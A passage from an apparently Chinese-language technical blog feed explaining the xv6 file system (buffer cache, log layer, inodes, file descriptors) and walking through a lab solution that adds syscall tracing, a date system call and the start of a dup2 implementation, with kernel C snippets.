<p>此数据结构在固定长度的数组上维护了一个由<code>struct buf</code>组成的双向链表，并且用一个锁来保护对Buffer Cache链表结构的访问。值得注意的是，对链表结构的访问和对一个<code>struct buf</code>结构的访问需要的是不同的锁。</p>
<p>在缓存初始化时，系统调用<code>binit()</code>对缓存进行初始化。<code>binit()</code>函数对缓存内每个元素初始化了睡眠锁，并从后往前连接成一个双向链表。一开始的时候，缓存内所有的块都是空的。</p>
<p>上层文件系统使用<code>bread()</code>和<code>bwrite()</code>对缓存中的磁盘块进行读写。关于缓存的全部操作是在<code>bread()</code>与<code>bwrite()</code>中自动完成的，不需要上层文件系统的参与。</p>
<p><code>bread()</code>会首先调用<code>bget()</code>函数，<code>bget()</code>函数会检查请求的磁盘块是否在缓存中。如果在缓存中，那么直接返回缓存中对应的磁盘块即可。如果不在缓存中，那么需要先使用最底层的<code>iderw()</code>函数先将此磁盘块从磁盘加载进缓存中，再返回此磁盘块。</p>
<p><code>bget()</code>函数的实现有一些Tricky。搜索缓存块的代码非常直接，但是在其中必须仔细考虑多进程同时访问磁盘块时的同步机制。在Xv6 rev7版本中由于没有实现睡眠锁，为了避免等待的缓冲区在等待的过程中改变了内容，必须在从锁中醒来时重新扫描磁盘缓冲区寻找合适的磁盘块，但是在rev11版本中由于实现了睡眠锁，在找到对应的缓存块时，只需释放对Buffer Cache的锁并拿到与当前缓存块有关的睡眠锁即可。</p>
<p><code>bwrite()</code>函数直接将缓存中的数据写入磁盘。Buffer Cache层不会尝试执行任何延迟写入的操作，何时调用<code>bwrite()</code>写入磁盘是由上层的文件系统控制的。</p>
<p>上层文件系统调用<code>brelse()</code>函数来释放一块不再使用的冲区。<code>brelse()</code>函数中主要涉及的是对双向链表的操作，在此不再赘述。</p>
<h3 id="log层的功能与实现"><a class="markdownIt-Anchor" href="#log层的功能与实现"></a> Log层的功能与实现</h3>
<p>在文件系统中添加Log层是为了能够使得文件系统能够处理诸如系统断电之类的异常情况，避免磁盘上的文件系统出现Inconsistency。Log层的实现思路是这样的，对于上层文件系统的全部磁盘操作，将其分割为一个个transaction，每个transaction都会首先将数据和其对应磁盘号写入磁盘上的Log区域，并且只有在Log区域写入全部完成后，再将Log区域的数据写入真正存储的数据区域。通过这种设计，如果在写入Log的时候断电，那么文件系统会当做这些写入不存在，如果在写入真正区域的时候断电，那么Log区域的数据可以用于恢复文件系统。如此，就可以避免文件系统中文件的损坏。</p>
<p>在Xv6 rev7的文件系统实现中，不允许多个进程并发地向Log层执行transaction，然而rev11的实现有所不同，允许多个进程并发地向Log层执行transaction。以下对实现细节的讨论基于rev11版本。</p>
<p>上层文件系统在使用log层时，必须首先调用<code>begin_op()</code>函数。<code>begin_op()</code>函数会记录一个新的transaction信息。在使用完log层后，上层系统必须调用<code>end_op()</code>函数。只有当没有transaction在执行时，log才会执行真正的磁盘写入。真正的磁盘写入操作在<code>commit()</code>函数中，可以看到<code>commit()</code>函数只有在<code>end_op()</code>结束，<code>log.outstanding==0</code>时才会被调用（以及开机的时刻）。<code>commit()</code>函数会先调用<code>write_log()</code>函数将缓存里的磁盘块写到磁盘上的Log区域里，并将Log Header写入到磁盘区域。只有当磁盘里存在Log Header的区域数据更新了，这一次Log更新才算完成。在Log区域更新后，<code>commit()</code>函数调用<code>install_trans()</code>完成真正的磁盘写入步骤，在这之后调用<code>write_head()</code>函数清空当前的Log数据。</p>
<h3 id="xv6-文件系统的硬盘布局"><a class="markdownIt-Anchor" href="#xv6-文件系统的硬盘布局"></a> xv6 文件系统的硬盘布局</h3>
<p>在Xv6操作系统的硬盘中，依次存放了如下几个硬盘块。对这些硬盘块的索引是直接使用一个整数来进行的，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[boot block | super block | log | inode blocks | free bit map | data blocks]</span><br></pre></td></tr></table></figure>
<p>第一个硬盘块boot block会在开机的时候被加载进内存，磁盘块编号是0。第二个superblock占据了一个硬盘块，编号是1，在Xv6中的声明如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct superblock &#123;</span><br><span class="line">  uint size;         &#x2F;&#x2F; Size of file system image (blocks)</span><br><span class="line">  uint nblocks;      &#x2F;&#x2F; Number of data blocks</span><br><span class="line">  uint ninodes;      &#x2F;&#x2F; Number of inodes.</span><br><span class="line">  uint nlog;         &#x2F;&#x2F; Number of log blocks</span><br><span class="line">  uint logstart;     &#x2F;&#x2F; Block number of first log block</span><br><span class="line">  uint inodestart;   &#x2F;&#x2F; Block number of first inode block</span><br><span class="line">  uint bmapstart;    &#x2F;&#x2F; Block number of first free map block</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Superblock中存储了文件系统有关的元信息。操作系统必须先读入Super Block才知道剩下的log块，inode块，bitmap块和datablock块的大小和位置。在Superblock之后顺序存储了多个log块、多个inode块、多个bitmap块。磁盘剩余的部分存储了data block块。</p>
<h3 id="xv6中的文件"><a class="markdownIt-Anchor" href="#xv6中的文件"></a> xv6中的文件</h3>
<p>Xv6中的文件(包括目录)全部用inode数据结构加以表示，所有文件的inode都会被存储在磁盘上。系统和进程需要使用某个inode时，这个inode会被加载到inode缓存里。存储在内存里的inode会比存储在磁盘上的inode多一些运行时信息。内存里的inode数据结构声明如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; in-memory copy of an inode</span><br><span class="line">struct inode &#123;</span><br><span class="line">  uint dev;           &#x2F;&#x2F; Device number</span><br><span class="line">  uint inum;          &#x2F;&#x2F; Inode number</span><br><span class="line">  int ref;            &#x2F;&#x2F; Reference count</span><br><span class="line">  struct sleeplock lock; &#x2F;&#x2F; protects everything below here</span><br><span class="line">  int valid;          &#x2F;&#x2F; inode has been read from disk?</span><br><span class="line"></span><br><span class="line">  short type;         &#x2F;&#x2F; copy of disk inode</span><br><span class="line">  short major;</span><br><span class="line">  short minor;</span><br><span class="line">  short nlink;</span><br><span class="line">  uint size;</span><br><span class="line">  uint addrs[NDIRECT+1];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中，<code>inode.type</code>指明了这个文件的类型。Xv6中，这个类型可以是普通文件，目录，或者是特殊文件。</p>
<p>内核会在内存中维护一个inode缓存，缓存的数据结构声明如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct &#123;</span><br><span class="line">  struct spinlock lock;</span><br><span class="line">  struct inode inode[NINODE];</span><br><span class="line">&#125; icache;</span><br></pre></td></tr></table></figure>
<p>对于Inode节点的基本操作如下</p>
<table>
<thead>
<tr>
<th style="text-align:left">函数名</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>iinit()</code></td>
<td style="text-align:left">读取Superblock，初始化inode相关的锁</td>
</tr>
<tr>
<td style="text-align:left"><code>ialloc()</code></td>
<td style="text-align:left">在磁盘上分配一个inode</td>
</tr>
<tr>
<td style="text-align:left"><code>iupdate()</code></td>
<td style="text-align:left">将内存里的一个inode写入磁盘</td>
</tr>
<tr>
<td style="text-align:left"><code>iget()</code></td>
<td style="text-align:left">获取指定inode，更新缓存</td>
</tr>
<tr>
<td style="text-align:left"><code>iput()</code></td>
<td style="text-align:left">对内存内一个Inode引用减1，引用为0则释放inode</td>
</tr>
<tr>
<td style="text-align:left"><code>ilock()</code></td>
<td style="text-align:left">获取指定inode的锁</td>
</tr>
<tr>
<td style="text-align:left"><code>iunlock()</code></td>
<td style="text-align:left">释放指定inode的锁</td>
</tr>
<tr>
<td style="text-align:left"><code>readi()</code></td>
<td style="text-align:left">往inode读数据</td>
</tr>
<tr>
<td style="text-align:left"><code>writei()</code></td>
<td style="text-align:left">往inode写数据</td>
</tr>
<tr>
<td style="text-align:left"><code>bmap()</code></td>
<td style="text-align:left">返回inode的第n个数据块的磁盘地址</td>
</tr>
</tbody>
</table>
<p>一个Inode有12(<code>NDIRECT</code>)个直接映射的磁盘块，有128个间接映射的磁盘块，这些合计起来，Xv6系统支持的最大文件大小为140*512B=70KB。</p>
<h3 id="xv6系统中的文件描述符"><a class="markdownIt-Anchor" href="#xv6系统中的文件描述符"></a> Xv6系统中的文件描述符</h3>
<p>Unix系统一个著名的设计哲学就是”Everything is a file”，这句话更准确地说是”Everything is a file descriptor”。上文所提的inode数据结构用于抽象文件系统中的文件和目录，而文件描述符除了抽象文件之外，还能抽象包含Pipe、Socket之类的其他IO，成为了一种通用的I/O接口。</p>
<p>Xv6中，一个文件的数据结构表示如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct file &#123;</span><br><span class="line">  enum &#123; FD_NONE, FD_PIPE, FD_INODE &#125; type;</span><br><span class="line">  int ref; &#x2F;&#x2F; reference count</span><br><span class="line">  char readable;</span><br><span class="line">  char writable;</span><br><span class="line">  struct pipe *pipe;</span><br><span class="line">  struct inode *ip;</span><br><span class="line">  uint off;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>从中可见，一个file数据结构既可以表示一个inode，也可以表示一个pipe。多个file数据结构可以抽象同一个inode，但是Offset可以不同。</p>
<p>系统所有的打开文件都在全局文件描述符表<code>ftable</code>中，<code>ftable</code>数据结构的声明如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct &#123;</span><br><span class="line">  struct spinlock lock;</span><br><span class="line">  struct file file[NFILE];</span><br><span class="line">&#125; ftable;</span><br></pre></td></tr></table></figure>
<p>从中可以看出Xv6最多支持同时打开100(<code>NFILE</code>)个文件，从<code>struct proc</code>中可以看出Xv6中每个进程最多同时可以打开16(<code>NOFILE</code>)个文件。</p>
<p>对File数据结构的基本操作包括<code>filealloc()</code>, <code>filedup()</code>, <code>fileclose()</code>, <code>fileread()</code>, <code>filewrite()</code>和<code>filestat()</code>。命名风格与Unix提供的接口一致，因此从名字很容易就能看出其基本功能。</p>
<p>对于Inode类型的file而言，上述操作的实现依赖于inode的诸如<code>iread()</code>，<code>iwrite()</code>等基本操作。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>xv6 System Call</title>
    <url>/2020/12/25/xv6-System-Call/</url>
    <content><![CDATA[<h2 id="part-one-system-call-tracing"><a class="markdownIt-Anchor" href="#part-one-system-call-tracing"></a> Part One: System call tracing</h2>
<h3 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> Introduction:</h3>
<p>Your first task is to modify the xv6 kernel to print out a line for each system call invocation. It is enough to print the name of the system call and the return value; you don’t need to print the system call arguments.</p>
<p>When you’re done, you should see output like this when booting xv6:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">fork -&gt; 2</span><br><span class="line">exec -&gt; 0</span><br><span class="line">open -&gt; 3</span><br><span class="line">close -&gt; 0</span><br><span class="line">write -&gt; 1</span><br><span class="line">write -&gt; 1</span><br></pre></td></tr></table></figure>
<p>That’s init forking and execing sh, sh making sure only two file descriptors are open, and sh writing the $ prompt. (Note: the output of the shell and the system call trace are intermixed, because the shell uses the write syscall to print its output.)</p>
<p><strong>Optional challenge</strong>: print the system call arguments.</p>
<h3 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution:</h3>
<p>第一部分需要打印出系统调用函数和返回的结果，根据文档给出的提示，我们知道这部分是定义在<code>syscall.c</code>文件里。接下来我们需要去阅读<code>syscall</code>这个函数的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">curproc</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">num = curproc-&gt;tf-&gt;eax;</span><br></pre></td></tr></table></figure>
<p>根据这几行代码，我们可以知道当操作系统由用户态进入到内核态的时候，需要进行陷阱中断，由用户态进入内核态，用户态的内容在xv6系统中是存在trapframe这个结构体中，这个结构体存的是中断前寄存器的内容,trapframe的结构如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">  <span class="comment">// registers as pushed by pusha</span></span><br><span class="line">  uint edi;</span><br><span class="line">  uint esi;</span><br><span class="line">  uint ebp;</span><br><span class="line">  uint oesp;      <span class="comment">// useless &amp; ignored</span></span><br><span class="line">  uint ebx;</span><br><span class="line">  uint edx;</span><br><span class="line">  uint ecx;</span><br><span class="line">  uint eax;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// rest of trap frame</span></span><br><span class="line">  ushort gs;</span><br><span class="line">  ushort padding1;</span><br><span class="line">  ushort fs;</span><br><span class="line">  ushort padding2;</span><br><span class="line">  ushort es;</span><br><span class="line">  ushort padding3;</span><br><span class="line">  ushort ds;</span><br><span class="line">  ushort padding4;</span><br><span class="line">  uint trapno;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// below here defined by x86 hardware</span></span><br><span class="line">  uint err;</span><br><span class="line">  uint eip;</span><br><span class="line">  ushort cs;</span><br><span class="line">  ushort padding5;</span><br><span class="line">  uint eflags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// below here only when crossing rings, such as from user to kernel</span></span><br><span class="line">  uint esp;</span><br><span class="line">  ushort ss;</span><br><span class="line">  ushort padding6;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>同样通过阅读源码我们可以知道当前系统调用数是存在eax寄存器中的，因此要打印出系统调用名称我们需要写一个数组进行一一映射：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* syscallNames[] = &#123;</span><br><span class="line">  [SYS_fork]  <span class="string">&quot;fork&quot;</span>,</span><br><span class="line">  [SYS_exit]  <span class="string">&quot;exit&quot;</span>,</span><br><span class="line">  [SYS_wait]  <span class="string">&quot;wait&quot;</span>,</span><br><span class="line">  [SYS_pipe]  <span class="string">&quot;pipe&quot;</span>,</span><br><span class="line">  [SYS_read]  <span class="string">&quot;read&quot;</span>,</span><br><span class="line">  [SYS_kill]  <span class="string">&quot;kill&quot;</span>,</span><br><span class="line">  [SYS_exec]  <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">  [SYS_fstat] <span class="string">&quot;fstat&quot;</span>,</span><br><span class="line">  [SYS_chdir] <span class="string">&quot;chdir&quot;</span>,</span><br><span class="line">  [SYS_dup]   <span class="string">&quot;dup&quot;</span>,</span><br><span class="line">  [SYS_getpid]<span class="string">&quot;getpid&quot;</span>,</span><br><span class="line">  [SYS_sbrk]  <span class="string">&quot;sbrk&quot;</span>,</span><br><span class="line">  [SYS_sleep] <span class="string">&quot;sleep&quot;</span>,</span><br><span class="line">  [SYS_uptime]<span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">  [SYS_open]  <span class="string">&quot;open&quot;</span>,</span><br><span class="line">  [SYS_write] <span class="string">&quot;write&quot;</span>,</span><br><span class="line">  [SYS_mknod] <span class="string">&quot;mknod&quot;</span>,</span><br><span class="line">  [SYS_unlink]<span class="string">&quot;unlink&quot;</span>,</span><br><span class="line">  [SYS_link]  <span class="string">&quot;link&quot;</span>,</span><br><span class="line">  [SYS_mkdir] <span class="string">&quot;mkdir&quot;</span>,</span><br><span class="line">  [SYS_close] <span class="string">&quot;close&quot;</span>,</span><br><span class="line">  [SYS_date]  <span class="string">&quot;date&quot;</span>,</span><br><span class="line">  [SYS_alarm] <span class="string">&quot;alarm&quot;</span>,</span><br><span class="line">  [SYS_dup2]  <span class="string">&quot;dup2&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>而返回值结果则被存在eax寄存器中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">curproc-&gt;tf-&gt;eax = syscalls[num]();</span><br></pre></td></tr></table></figure>
<p>因此此题解法就呼之欲出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cprintf(<span class="string">&quot;SYSCALL: name: %s --&gt; return value: %d\n&quot;</span>,syscallNames[num], curproc-&gt;tf-&gt;eax);</span><br></pre></td></tr></table></figure>
<p>接下来的挑战内容是打印出系统调用参数。</p>
<p>阅读源码，我们可以发现<code>argint</code>函数及其描述：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Fetch the nth 32-bit system call argument.</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">argint(<span class="keyword">int</span> n, <span class="keyword">int</span> *ip)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> fetchint((myproc()-&gt;tf-&gt;esp) + <span class="number">4</span> + <span class="number">4</span>*n, ip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这个函数调用了<code>fetchint</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// User code makes a system call with INT T_SYSCALL.</span></span><br><span class="line"><span class="comment">// System call number in %eax.</span></span><br><span class="line"><span class="comment">// Arguments on the stack, from the user call to the C</span></span><br><span class="line"><span class="comment">// library system call function. The saved user %esp points</span></span><br><span class="line"><span class="comment">// to a saved program counter, and then the first argument.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch the int at addr from the current process.</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">fetchint(uint addr, <span class="keyword">int</span> *ip)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">curproc</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(addr &gt;= curproc-&gt;sz || addr+<span class="number">4</span> &gt; curproc-&gt;sz)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  *ip = *(<span class="keyword">int</span>*)(addr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合阅读<code>fetchint</code>的源码和其上面的注释，我们可以很轻松地知道系统调用的参数存储在<code>(tf-&gt;esp)+4</code>之上，其中<code>(tf-&gt;esp)+4</code>即为第一个参数所在的位置。由于系统调用参数是在用户态中设置，在陷阱中断的过程中压入栈中，并且由esp寄存器记录栈顶指针。所以我们在内核态中无法知道每个系统调用共有几个参数，因此我们也可以定义一个参数用来记录每个系统调用函数有几个参数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> syscallArgs[] = &#123;</span><br><span class="line">  [SYS_fork]    <span class="number">0</span>,</span><br><span class="line">  [SYS_exit]    <span class="number">0</span>,</span><br><span class="line">  [SYS_wait]    <span class="number">0</span>,</span><br><span class="line">  [SYS_pipe]    <span class="number">1</span>,</span><br><span class="line">  [SYS_read]    <span class="number">3</span>,</span><br><span class="line">  [SYS_kill]    <span class="number">1</span>,</span><br><span class="line">  [SYS_exec]    <span class="number">2</span>,</span><br><span class="line">  [SYS_fstat]   <span class="number">1</span>,</span><br><span class="line">  [SYS_chdir]   <span class="number">1</span>,</span><br><span class="line">  [SYS_dup]     <span class="number">1</span>,</span><br><span class="line">  [SYS_getpid]  <span class="number">0</span>,</span><br><span class="line">  [SYS_sbrk]    <span class="number">1</span>,</span><br><span class="line">  [SYS_sleep]   <span class="number">1</span>,</span><br><span class="line">  [SYS_uptime]  <span class="number">2</span>,</span><br><span class="line">  [SYS_open]    <span class="number">2</span>,</span><br><span class="line">  [SYS_write]   <span class="number">3</span>,</span><br><span class="line">  [SYS_mknod]   <span class="number">3</span>,</span><br><span class="line">  [SYS_unlink]  <span class="number">1</span>,</span><br><span class="line">  [SYS_link]    <span class="number">2</span>,</span><br><span class="line">  [SYS_mkdir]   <span class="number">1</span>,</span><br><span class="line">  [SYS_close]   <span class="number">1</span>,</span><br><span class="line">  [SYS_date]    <span class="number">1</span>,</span><br><span class="line">  [SYS_alarm]   <span class="number">2</span>,</span><br><span class="line">  [SYS_dup2]    <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>同时，根据数组的参数个数的记录，我们遍历栈空间去输出参数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">uint esp = curproc-&gt;tf-&gt;esp;</span><br><span class="line"><span class="keyword">int</span> nums = syscallArgs[num]; </span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">cprintf(<span class="string">&quot;args: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(nums == <span class="number">0</span>)&#123;</span><br><span class="line">    cprintf(<span class="string">&quot;No Arguments&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(nums &gt;= <span class="number">1</span>)&#123;</span><br><span class="line">    cprintf(<span class="string">&quot;0x%x &quot;</span>, *((<span class="keyword">int</span> *)(esp + <span class="number">4</span>*i)));</span><br><span class="line">    i++;</span><br><span class="line">    nums--;</span><br><span class="line">&#125;</span><br><span class="line">cprintf(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="part-two-data-system-call"><a class="markdownIt-Anchor" href="#part-two-data-system-call"></a> Part Two: Data system call</h2>
<h3 id="introduction-2"><a class="markdownIt-Anchor" href="#introduction-2"></a> Introduction</h3>
<p>Your second task is to add a new system call to xv6. The main point of the exercise is for you to see some of the different pieces of the system call machinery. Your new system call will get the current UTC time and return it to the user program. You may want to use the helper function, <code>cmostime()</code> (defined in <code>lapic.c</code>), to read the real time clock. <code>date.h</code> contains the definition of the <code>struct rtcdate</code> struct, which you will provide as an argument to <code>cmostime()</code> as a pointer.</p>
<p>You should create a user-level program that calls your new date system call; here’s some source you should put in <code>date.c</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;date.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (date(&amp;r)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">&quot;date failed\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// your code to print the time in any format you like...</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In order to make your new <code>date</code> program available to run from the xv6 shell, add <code>_date</code> to the <code>UPROGS</code> definition in <code>Makefile</code>.</p>
<p>Your strategy for making a date system call should be to clone all of the pieces of code that are specific to some existing system call, for example the “uptime” system call. You should grep for uptime in all the source files, using <code>grep -n uptime *.[chS]</code>.</p>
<p>When you’re done, typing <code>date</code> to an xv6 shell prompt should print the current UTC time.</p>
<p>Write down a few words of explanation for each of the files you had to modify in the process of creating your date system call.</p>
<p><strong>Optional challenge</strong>: add a <code>dup2()</code> system call and modify the shell to use it.</p>
<h3 id="solution-2"><a class="markdownIt-Anchor" href="#solution-2"></a> Solution:</h3>
<p>第二部分要求我们去添加一个系统调用<code>date</code>用来打印当前日期，其中用户态的函数已经给出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;date.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (date(&amp;r)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">&quot;date failed\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// your code to print the time in any format you like...</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要我们写出内核态的系统调用供用户使用。</p>
<p>根据题目提示，我们知道date系统调用需要接受一个<code>rctdate</code>结构体参数，并且通过<code>cmostime()</code>函数获取当前的时间。因此我们要做的就是把结构体参数压入栈中，并且调用<code>cmostime()</code>去获得当前时间：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">sys_date(struct rtcdate* r)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (argptr(<span class="number">0</span>, (<span class="keyword">void</span> *)&amp;r, <span class="keyword">sizeof</span>(*r)) &lt; <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  cmostime(r);  <span class="comment">//从cmos中获取时间</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>值得注意的是，由于<code>rtcdate</code>是个结构体参数，因此我们需要通过<code>argptr</code>而非<code>argint</code>来进行参数的压栈：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Fetch the nth word-sized system call argument as a pointer</span></span><br><span class="line"><span class="comment">// to a block of memory of size bytes.  Check that the pointer</span></span><br><span class="line"><span class="comment">// lies within the process address space.</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">argptr(<span class="keyword">int</span> n, <span class="keyword">char</span> **pp, <span class="keyword">int</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">curproc</span> =</span> myproc();</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(argint(n, &amp;i) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(size &lt; <span class="number">0</span> || (uint)i &gt;= curproc-&gt;sz || (uint)i+size &gt; curproc-&gt;sz)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  *pp = (<span class="keyword">char</span>*)i;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来是可选挑战，可选挑战需要我们去实现一个<code>dup2</code>的系统调用，这个挑战有些难度，需要我们文件描述符等概念比较熟悉，在开始实现<code>dup2()</code>之前，我们先讲解一下<code>dup</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">sys_dup(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argfd(<span class="number">0</span>, <span class="number">0</span>, &amp;f) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>((fd=fdalloc(f)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  filedup(f);</span><br><span class="line">  <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用函数<code>dup</code>，我们可以复制一个描述符。传给该函数一个既有的描述符，它就会返回一个新的描述符， 这个新的描述符是传给它的描述符的拷贝。这意味着，这两个描述符共享同一个数据结构。例如， 如果我们对一个文件描述符执行<code>lseek</code>操作，得到的第一个文件的位置和第二个是一样的。</p>
<p>注意到<code>sys_dup</code>函数调用了<code>argfd</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">argfd(<span class="keyword">int</span> n, <span class="keyword">int</span> *pfd, struct file **pf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argint(n, &amp;fd) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(fd &lt; <span class="number">0</span> || fd &gt;= NOFILE || (f=myproc()-&gt;ofile[fd]) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(pfd)</span><br><span class="line">    *pfd = fd;</span><br><span class="line">  <span class="keyword">if</span>(pf)</span><br><span class="line">    *pf = f;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
